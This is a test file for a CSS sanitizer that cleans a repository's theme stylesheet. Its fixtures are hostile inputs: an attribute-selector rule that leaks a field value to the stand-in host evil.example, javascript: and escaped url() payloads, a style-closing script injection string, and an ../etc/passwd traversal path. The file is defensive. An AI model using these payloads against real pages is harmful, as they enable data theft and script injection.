import { describe, expect, test } from "bun:test"
import { cleanStyleModule } from "#styles/clean"

const FILE = "styles/theme.css"

/** Cleans `css` as `styles/theme.css` of a repository with `docs/img/`. */
function clean(css: string) {
  return cleanStyleModule(css, {
    file: FILE,
    docsFiles: new Set(["img/fondo.png", "img/notas.txt", "red/dns.mdx"]),
    fileUrlOf: (docsPath) => `/api/v1/docs/casa/files/${docsPath}`,
  })
}

function messages(css: string): string[] {
  return clean(css).problems.map((problem) => problem.message)
}

describe("cleanStyleModule", () => {
  test("plain rules and theme tokens are kept, comments are not", () => {
    const result = clean(
      "/* brand */\n:root { --primary: oklch(0.6 0.2 250); }\n.dark { --primary: red }"
    )
    expect(result.css).toBe(
      ":root{--primary:oklch(0.6 0.2 250)}.dark{--primary:red}"
    )
    expect(result.problems).toEqual([])
  })

  test("@import is removed and reported with its line, the rest is kept", () => {
    const result = clean(
      '@import url("https://fonts.example.com/inter.css");\n:root { --primary: blue }'
    )
    expect(result.css).toBe(":root{--primary:blue}")
    expect(result.problems).toEqual([
      {
        file: FILE,
        line: 1,
        message: expect.stringContaining("«@import»"),
      },
    ])
  })

  test("an at-rule outside the allow-list is removed, even written with escapes", () => {
    expect(clean("@page { margin: 0 }\n@\\69mport 'x.css';").css).toBe("")
    expect(messages("@namespace svg url(http://www.w3.org/2000/svg);")).toEqual(
      [expect.stringContaining("«@namespace»")]
    )
  })

  test("allowed at-rules are kept with their nested rules", () => {
    const css = [
      "@media (prefers-color-scheme: dark) { :root { --a: b } }",
      "@supports (display: grid) { .a { display: grid } }",
      "@container side (min-width: 30rem) { .a { gap: 1rem } }",
      "@layer marca { .a { color: red } }",
      "@keyframes latido { from { opacity: 0 } }",
      '@property --giro { syntax: "<angle>"; inherits: false; initial-value: 0deg }',
      "@scope (.typeset) { p { margin: 0 } }",
      "@starting-style { .a { opacity: 0 } }",
    ].join("\n")
    const result = clean(css)
    expect(result.problems).toEqual([])
    expect(result.css).toContain("@media (prefers-color-scheme:dark)")
    expect(result.css).toContain("@keyframes latido")
    expect(result.css).toContain("@starting-style")
  })

  test("external, protocol-relative and script URLs remove their declaration", () => {
    const result = clean(
      [
        ".a { background: url(https://evil.example/a); color: red }",
        ".b { background: url(//evil.example/b) }",
        '.c { background: url("javascript:alert(1)") }',
        ".d { background: url(/api/v1/docs/otro/files/x.png) }",
      ].join("\n")
    )
    expect(result.css).toBe(".a{color:red}.b{}.c{}.d{}")
    expect(result.problems.map((problem) => problem.line)).toEqual([1, 2, 3, 4])
  })

  test("a value leaked through an attribute selector cannot reach outside", () => {
    const result = clean(
      'input[value^="a"] { background: url(https://evil.example/a) }'
    )
    expect(result.css).not.toContain("evil.example")
    expect(result.problems).toHaveLength(1)
  })

  test("data: images and fonts are kept, other data: types are not", () => {
    const result = clean(
      [
        ".a { background: url(data:image/png;base64,AAAA) }",
        '@font-face { font-family: Marca; src: url(data:font/woff2;base64,AA) format("woff2") }',
        ".b { background: url(data:text/html;base64,PHNjcmlwdD4=) }",
      ].join("\n")
    )
    expect(result.css).toContain("url(data:image/png;base64,AAAA)")
    expect(result.css).toContain("url(data:font/woff2;base64,AA)")
    expect(result.css).not.toContain("text/html")
    expect(result.problems.map((problem) => problem.line)).toEqual([3])
  })

  test("a relative path to an image under docs/ is rewritten to the reader's route", () => {
    const result = clean(".a { background-image: url(../docs/img/fondo.png) }")
    expect(result.css).toBe(
      ".a{background-image:url(/api/v1/docs/casa/files/img/fondo.png)}"
    )
    expect(result.problems).toEqual([])
  })

  test("a missing file, a non-image or a path outside docs/ is removed", () => {
    expect(
      messages(
        [
          ".a { background: url(../docs/img/nada.png) }",
          ".b { background: url(../docs/img/notas.txt) }",
          ".c { background: url(../doc.config.yaml) }",
          ".d { background: url(../docs/../../etc/passwd.png) }",
        ].join("\n")
      )
    ).toHaveLength(4)
  })

  test("a URL hidden in a custom property is removed", () => {
    const result = clean(
      ".a { --fondo: url(//evil.example/x.png); color: red }"
    )
    expect(result.css).toBe(".a{color:red}")
    expect(result.problems).toEqual([
      expect.objectContaining({
        message: expect.stringContaining("«--fondo»"),
      }),
    ])
  })

  test("strings that functions fetch are checked like URLs, escaped names included", () => {
    const result = clean(
      [
        '.a { background: image-set("https://evil.example/a.png" 1x) }',
        '.b { background: u\\72l("https://evil.example/b.png") }',
        '.c { background: image-set("../docs/img/fondo.png" 1x) }',
      ].join("\n")
    )
    expect(result.css).not.toContain("evil.example")
    expect(result.css).toContain('"/api/v1/docs/casa/files/img/fondo.png"')
    expect(result.problems.map((problem) => problem.line)).toEqual([1, 2])
  })

  test("properties that ran script are removed", () => {
    const result = clean(
      ".a { behavior: url(x.htc); -moz-binding: none; color: red }"
    )
    expect(result.css).toBe(".a{color:red}")
    expect(result.problems).toHaveLength(2)
  })

  test("the stylesheet never contains <, so it cannot close its style element", () => {
    const result = clean(
      '.a::before { content: "</style><script>alert(1)</script>" }\n.b { --x: "<" }'
    )
    expect(result.css).not.toContain("<")
    expect(result.css).toContain('"\\3c /style>\\3c script>')
  })

  test("what css-tree cannot read is removed and reported, the rest is kept", () => {
    const result = clean(
      ".a { color: red }\n.b { color: blue } }}} .c {\n.d { color: green }"
    )
    expect(result.css).toContain(".a{color:red}")
    expect(result.css).not.toContain("}}}")
    expect(result.problems.length).toBeGreaterThan(0)
    expect(result.problems[0]?.line).toBe(2)
  })
})
